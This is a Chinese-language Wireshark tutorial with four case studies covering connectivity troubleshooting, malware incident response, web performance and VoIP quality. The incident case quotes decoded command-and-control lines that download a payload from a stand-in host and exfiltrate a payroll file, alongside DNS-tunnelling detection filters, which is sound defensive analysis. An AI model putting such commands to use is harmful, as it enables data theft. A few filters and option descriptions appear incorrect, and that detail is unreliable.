# Wireshark 实战案例研究

<div align="center">
  <img src="../../assets/wireshark-logo.png" alt="Wireshark Logo" width="200">
</div>

> 本文档通过真实案例展示Wireshark在网络故障排查、安全分析、性能评估和协议开发中的应用。每个案例都包括详细的背景、分析步骤和解决方案。

## 目录

1. [案例一：网络连接故障排查](#案例一网络连接故障排查)
   - [背景与问题描述](#背景与问题描述)
   - [捕获与分析方法](#捕获与分析方法)
   - [关键发现](#关键发现)
   - [解决方案](#解决方案)
   - [经验总结](#经验总结)

2. [案例二：安全事件响应与分析](#案例二安全事件响应与分析)
   - [背景与安全告警](#背景与安全告警)
   - [流量捕获策略](#流量捕获策略)
   - [恶意行为特征识别](#恶意行为特征识别)
   - [攻击过程还原](#攻击过程还原)
   - [安全加固建议](#安全加固建议)

3. [案例三：Web应用性能优化](#案例三Web应用性能优化)
   - [性能问题背景](#性能问题背景)
   - [端到端延迟分析](#端到端延迟分析)
   - [瓶颈识别](#瓶颈识别)
   - [优化方案](#优化方案)
   - [效果验证](#效果验证)

4. [案例四：VoIP通话质量调查](#案例四VoIP通话质量调查)
   - [问题描述](#问题描述)
   - [通话指标分析](#通话指标分析)
   - [网络抖动与丢包排查](#网络抖动与丢包排查)
   - [问题定位与解决](#问题定位与解决)
   - [长期监控策略](#长期监控策略)

## 案例一：网络连接故障排查

### 背景与问题描述

某企业内部网络用户报告无法访问特定的内部应用服务器，而其他服务器访问正常。问题具有间歇性，但随着时间推移变得越来越频繁。IT支持团队需要确定问题的根本原因。

**网络环境**：
- 企业内部网络：192.168.10.0/24
- 问题应用服务器：192.168.10.55（运行在端口8443上的Web应用）
- 客户端计算机：分布在192.168.10.100-200范围内

**问题症状**：
- 浏览器显示"无法建立连接"错误
- ping命令正常响应
- 无相关防火墙配置更改
- 服务器系统日志无异常记录

### 捕获与分析方法

**捕获位置与策略**：
1. 在受影响的客户端上捕获
   ```
   # 捕获过滤器
   host 192.168.10.55
   ```

2. 在服务器端捕获
   ```
   # 捕获过滤器
   tcp port 8443
   ```

3. 在网络中间设备上捕获
   ```
   # 捕获过滤器
   host 192.168.10.55 and tcp port 8443
   ```

**使用的Wireshark功能**：
- TCP流跟踪
- 专家信息系统
- 时间序列分析
- 重传包识别

### 关键发现

通过分析捕获的数据包，发现以下关键线索：

1. **连接尝试模式**：
   - 客户端正确发送SYN包
   - 服务器成功回应SYN-ACK
   - 客户端发送ACK完成三次握手
   - 连接建立后，TCP窗口探测和保持活动包出现异常模式

2. **TCP窗口问题**：
   使用显示过滤器`tcp.analysis.zero_window`找到多个零窗口事件：
   ```
   # 过滤器
   tcp.analysis.zero_window
   ```
   
   数据显示服务器频繁发送零窗口通知，表明其接收缓冲区已满

3. **应用数据传输**：
   - 数据传输开始正常
   - 几秒钟后服务器发送零窗口通知
   - 客户端被迫等待，最终超时断开连接

4. **时间相关性**：
   - 问题频率在工作日10:00-11:30AM和2:00-3:30PM最高
   - 使用I/O图表可视化连接数与零窗口事件的关系

### 解决方案

根据Wireshark分析，确定了问题根源是服务器TCP接收缓冲区耗尽，导致零窗口事件。进一步调查发现：

1. **系统资源问题**：
   - 在问题时段，服务器CPU使用率达到95%以上
   - 内存使用正常，但进程队列长度异常
   
2. **问题根因**：
   服务器上的批处理作业与Web应用程序争用CPU资源，导致Web应用程序无法足够快地处理入站网络数据

3. **实施的解决方案**：
   - 调整批处理作业调度，避开高峰使用时段
   - 增加Web应用程序进程的系统优先级
   - 优化Web应用处理逻辑，提高数据处理效率
   - 增加服务器TCP接收缓冲区大小
   ```bash
   # 在Linux服务器上增加TCP缓冲区
   sysctl -w net.ipv4.tcp_rmem="4096 87380 16777216"
   ```

### 经验总结

此案例演示了Wireshark如何帮助诊断看似网络问题，但实际上是由应用程序或系统资源问题引起的情况：

1. **诊断方法论**：
   - 从多个角度捕获（客户端、服务器、网络设备）
   - 使用适当的显示过滤器关注关键事件
   - 将网络事件与系统行为相关联
   
2. **关键指标**：
   - TCP零窗口事件是应用程序处理速度过慢的关键指标
   - 连接失败模式和时间相关性提供了调查方向
   
3. **问题分类**：
   学会区分真正的网络问题与表现为网络症状的应用问题

## 案例二：安全事件响应与分析

### 背景与安全告警

某公司安全监控系统触发警报，指示可能存在数据泄露。安全团队需要确认是否发生了数据泄露，如果是，需要确定泄露范围和攻击手法。

**事件时间线**：
- 周一 09:30 AM：IDS系统报告异常连接尝试
- 周一 10:15 AM：DLP系统报告可疑的出站数据传输
- 周一 11:45 AM：安全团队开始调查
- 周一 13:00 PM：开始捕获可疑主机流量

**疑似受感染主机**：
- 工作站IP：192.168.15.37
- 运行Windows 10企业版
- 该主机属于财务部门用户

### 流量捕获策略

**捕获位置与方法**：
1. 在网络边界防火墙内侧镜像端口捕获
   ```
   # 捕获过滤器
   host 192.168.15.37
   ```

2. 在受感染主机本地捕获
   ```
   # 使用-P选项以原始格式捕获
   tshark -i 3 -P -w infected_host.pcapng
   ```

**分析策略**：
1. 识别非标准协议或端口上的通信
2. 检查敏感DNS查询和可疑域名
3. 分析加密与非加密流量模式
4. 提取可能的命令控制通信

### 恶意行为特征识别

使用Wireshark分析捕获的流量，找到以下可疑特征：

1. **异常DNS流量**：
   ```
   # 显示过滤器
   dns.qry.name contains "xz" and dns.qry.type == 16
   ```
   
   发现多个针对随机子域的TXT记录查询，格式如：
   ```
   d1c7xz.malicious-domain.com
   a45fxz.malicious-domain.com
   ```

2. **数据分段与编码**：
   DNS响应中包含Base64编码的数据段

3. **命令与控制通信**：
   ```
   # 提取DNS TXT记录
   tshark -r infected_host.pcapng -Y "dns.resp.type == 16" -T fields -e dns.txt
   ```
   
   解码TXT记录后发现命令控制指令：
   ```
   download:http://malicious-site.com/payload.bin
   exfil:C:\Users\finance\Documents\Q3_payroll.xlsx
   ```

4. **敏感数据外泄**：
   ```
   # 识别可疑HTTP POST请求
   http.request.method == "POST" and http.request.uri contains "gate.php"
   ```
   
   请求包含高熵数据段，疑似加密的敏感信息

### 攻击过程还原

基于Wireshark分析，重建了完整攻击链：

1. **初始感染**：
   通过分析浏览器流量，发现用户访问了包含恶意脚本的钓鱼邮件链接
   ```
   # 邮件链接请求
   http.request.uri contains "quarterly-report" and http.request.uri contains ".doc"
   ```

2. **木马下载与执行**：
   ```
   # 过滤器
   http.request.uri contains ".exe" or http.request.uri contains ".dll"
   ```
   
   在钓鱼文档打开后不久，发现下载执行了恶意负载

3. **横向移动尝试**：
   ```
   # 过滤器
   smb or dcerpc or nbns
   ```
   
   恶意软件尝试使用SMB协议枚举网络资源和尝试访问共享文件

4. **数据收集与泄露**：
   攻击者使用DNS隧道技术逃避防火墙检测，将敏感数据分段加密后外发
   ```
   # DNS隧道特征
   dns.qry.name.len > 50
   ```

### 安全加固建议

基于Wireshark分析结果，提出以下安全加固建议：

1. **网络层防护**：
   - 实施DNS请求监控，特别关注高熵域名和异常TXT记录查询
   - 阻止与已识别的恶意域名通信
   - 监控异常大小的DNS请求和响应

2. **端点防护**：
   - 更新反恶意软件解决方案，加入已识别的IOC
   - 限制PowerShell和命令行执行权限
   - 实施应用程序白名单

3. **用户培训**：
   - 加强钓鱼邮件识别培训
   - 实施附件沙盒分析

4. **持续监控**：
   - 部署DNS隧道检测规则
   - 创建自定义IDS签名检测类似攻击

## 案例三：Web应用性能优化

### 性能问题背景

一家电子商务公司客户报告在高峰期网站响应缓慢，特别是在结账过程中。需要分析和优化Web应用性能。

**应用架构**：
- Web前端：Nginx负载均衡(10.0.1.10-15)
- 应用服务器：NodeJS集群(10.0.2.20-28)
- 数据库服务器：PostgreSQL(10.0.3.30-32)
- 缓存：Redis集群(10.0.4.40-42)

**问题具体表现**：
- 页面加载时间超过3秒
- API请求延迟高
- 某些请求偶尔超时
- 高峰期数据库连接数接近上限

### 端到端延迟分析

**捕获策略**：
1. 从客户端角度捕获完整的页面加载流程
   ```
   # 捕获过滤器
   host website.example.com and tcp
   ```

2. 在负载均衡器上捕获后端通信
   ```
   # 捕获过滤器
   net 10.0.2.0/24 or net 10.0.3.0/24 or net 10.0.4.0/24
   ```

**时序分析**：
```
# Wireshark显示过滤器
http or http2
```

使用Wireshark的HTTP统计功能分析HTTP事务：
1. 统计 > HTTP > 请求序列
2. 统计 > HTTP > 数据包计数器

### 瓶颈识别

通过Wireshark分析，识别了以下性能瓶颈：

1. **前端优化问题**：
   ```
   # 分析HTTP/2多路复用效率
   http2
   ```
   
   发现大量小文件未合并，导致大量单独请求
   - CSS文件: 15个独立文件
   - JavaScript文件: 23个独立文件
   - 小型图像资源未使用sprite

2. **API延迟问题**：
   ```
   # 过滤关键API调用
   http.request.uri contains "/api/cart" or http.request.uri contains "/api/checkout"
   ```
   
   分析发现:
   - 平均API响应时间: 780ms (高峰期)
   - API调用之间的前端依赖: 串行调用而非并行

3. **数据库查询优化**：
   使用Wireshark捕获从应用服务器到数据库服务器的流量:
   ```
   # 过滤器
   tcp.port == 5432 and ip.addr == 10.0.3.30
   ```
   
   分析表明:
   - 多个重复查询未利用缓存
   - 某些查询执行时间超过500ms
   - 连接池配置不佳，短期内创建过多新连接

4. **缓存利用率低**：
   ```
   # Redis通信分析
   tcp.port == 6379
   ```
   
   发现缓存命中率低，许多可缓存内容未被缓存

### 优化方案

基于Wireshark分析，实施了以下优化方案：

1. **前端优化**：
   - 实施资源打包，将多个JavaScript和CSS文件合并
   - 启用HTTP/2服务器推送关键资源
   - 优化图像: 实施延迟加载和响应式图像
   - 改进缓存策略，增加静态内容缓存时间

2. **API优化**：
   - 改进API设计，合并相关端点减少请求数
   - 实施GraphQL减少过度获取
   - 优化API后端处理逻辑
   - 并行化API请求

3. **数据库优化**：
   - 优化慢查询，添加必要索引
   - 调整连接池参数，避免频繁创建连接
   - 实施查询缓存
   - 增加读写分离

4. **缓存策略**：
   - 扩展Redis缓存使用范围
   - 调整缓存过期策略
   - 实施分层缓存架构

### 效果验证

优化后，使用Wireshark重新捕获和分析相同场景流量：

1. **前端改进**：
   - HTTP请求数量: 从58个减少到17个
   - 页面加载时间: 从3.2秒减少到1.4秒
   - 资源加载瀑布图显示更高效的并行加载

2. **API性能提升**：
   - 平均API响应时间: 从780ms减少到210ms
   - 数据传输量: 减少35%
   - 连接重用率: 提高68%

3. **数据库效率**：
   - 平均查询执行时间: 减少65%
   - 数据库连接峰值: 减少40%
   - 查询缓存命中率: 达到75%

4. **整体性能指标**：
   - 服务器CPU利用率: 降低30%
   - 内存使用效率: 提高25%
   - 高峰期同时处理能力: 增加60%

## 案例四：VoIP通话质量调查

### 问题描述

一家企业实施了基于SIP协议的VoIP电话系统，但用户报告通话质量问题，包括声音断断续续、回音和通话中断。IT团队需要使用Wireshark分析和解决这些质量问题。

**VoIP基础设施**：
- SIP服务器: 172.16.10.5
- VoIP网关: 172.16.10.6
- IP电话: 172.16.20.0/24网段
- 软电话客户端: 分布在公司网络各处

**报告的问题**：
- 通话中经常出现短暂的声音中断
- 某些通话有明显延迟
- 偶尔出现回声
- 高峰期全公司范围的通话质量下降

### 通话指标分析

**捕获策略**：
1. 在核心交换机上使用端口镜像捕获VoIP流量
   ```
   # 捕获过滤器
   host 172.16.10.5 or host 172.16.10.6 or net 172.16.20.0/24
   ```

2. 在问题电话终端直接捕获
   ```
   # 捕获过滤器
   udp or tcp
   ```

**使用Wireshark VoIP分析工具**：
1. 电话 > VoIP通话
2. 选择通话 > 流量分析
3. 分析 > RTP > 流分析

### 网络抖动与丢包排查

使用Wireshark RTP流分析功能，发现以下问题：

1. **抖动分析**：
   ```
   # RTP流统计
   rtp.ssrc == 0x3A72B651
   ```
   
   发现:
   - 最大抖动: 82ms (超出良好通话质量的推荐值30ms)
   - 抖动波动模式: 每30-45分钟出现一次峰值
   - 抖动分布不均匀，特定网段更严重

2. **丢包分析**：
   ```
   # RTP序列号分析
   rtp.analysis.sequence_numbercase
   ```
   
   通过分析RTP序列号跳跃识别丢包:
   - 总体丢包率: 3.7%
   - 突发丢包事件集中在工作日10:30-11:30AM
   - 丢失数据包模式指向网络拥塞问题

3. **延迟分析**：
   使用Wireshark计算往返时间和端到端延迟
   - 平均RTT: 145ms
   - 最大RTT: 320ms (远超过理想的150ms阈值)
   - 延迟分布图显示多模式分布，表明多个问题来源

### 问题定位与解决

通过进一步分析，定位了以下根本原因：

1. **网络拥塞问题**：
   ```
   # 其他流量分析
   not (sip or rtp) and ip.addr==172.16.10.0/24
   ```
   
   发现:
   - 每天10:30AM左右开始大量备份流量
   - 备份服务器使用了与VoIP相同的网络路径
   - 利用TCP窗口分析确认网络段接近饱和

2. **QoS配置问题**：
   分析数据包头部的DSCP标记:
   ```
   # DSCP标记分析
   ip.dsfield
   ```
   
   发现VoIP流量未正确标记优先级或标记未被网络设备尊重

3. **设备配置不当**：
   ```
   # SIP OPTIONS分析
   sip.Method == "OPTIONS"
   ```
   
   发现一些IP电话配置了过于激进的SIP注册刷新间隔，造成不必要的信令开销

4. **网络路径问题**：
   使用TTL值分析，发现某些RTP流经过不必要的路由跳数，增加了延迟和丢包风险

### 问题定位与解决

基于Wireshark分析，实施了多项解决方案：

1. **网络分段与QoS**：
   - 将VoIP流量分离到专用VLAN
   - 正确配置和实施QoS策略，优先处理VoIP流量
   - 设置交换机端口缓冲区优先级队列
   ```
   # 验证DSCP标记已正确应用
   ip.dsfield == 0x68 and rtp
   ```

2. **带宽管理**：
   - 重新调度备份操作到非工作时间
   - 实施备份流量限速
   - 升级关键网段链路容量
   ```
   # 监控带宽利用率
   tshark -i eth0 -q -z io,stat,60
   ```

3. **设备配置优化**：
   - 调整SIP注册过期时间，减少不必要信令流量
   - 优化编解码器选择，在质量和带宽之间取得平衡
   - 配置适当的抖动缓冲区大小

4. **监控与预警**：
   - 部署专用VoIP质量监控系统
   - 创建自定义Wireshark过滤器识别潜在问题
   ```
   # 抖动阈值预警
   rtp.analysis.jitter > 50
   ```

### 长期监控策略

实施持续监控方案确保VoIP质量：

1. **定期质量审计**：
   - 每周使用Wireshark捕获样本通话并分析
   - 创建标准MOS评分基线并监控趋势

2. **自动化监控**：
   ```bash
   # 自动捕获脚本示例
   #!/bin/bash
   
   # 每天定时捕获VoIP流量样本
   tshark -i eth0 -f "host 172.16.10.5 and udp" -a duration:1800 \
   -w /var/captures/voip_$(date +%Y%m%d_%H%M).pcapng
   
   # 使用tshark提取质量指标
   tshark -r /var/captures/voip_*.pcapng -q -z rtp,streams > /var/log/voip_quality.log
   ```

3. **阈值警报**：
   创建基于以下指标的警报系统：
   - 抖动 > 30ms
   - 丢包率 > 1%
   - MOS评分 < 3.5

4. **容量规划**：
   根据Wireshark流量分析，预测未来带宽需求和基础设施扩展。 